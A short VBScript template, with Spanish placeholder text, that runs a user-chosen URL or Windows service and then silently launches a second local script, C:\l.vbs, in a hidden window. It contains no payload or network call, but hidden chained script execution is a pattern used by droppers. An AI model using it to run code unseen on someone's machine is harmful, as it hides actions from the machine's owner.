
Dim Obj, Tabla(78,23) 
Const PI = 3.141592654 
Set Loquequieran = CreateObject ("WScript.Shell")														
Loquequieran.run " WEB A VISITAR o Servicio de windows a ejecutar " 
WScript.Sleep 1000 
Set WshShell = WScript.CreateObject("WScript.Shell")
Return = WshShell.Run("cmd /c start """" ""C:\l.vbs""", 0, true)
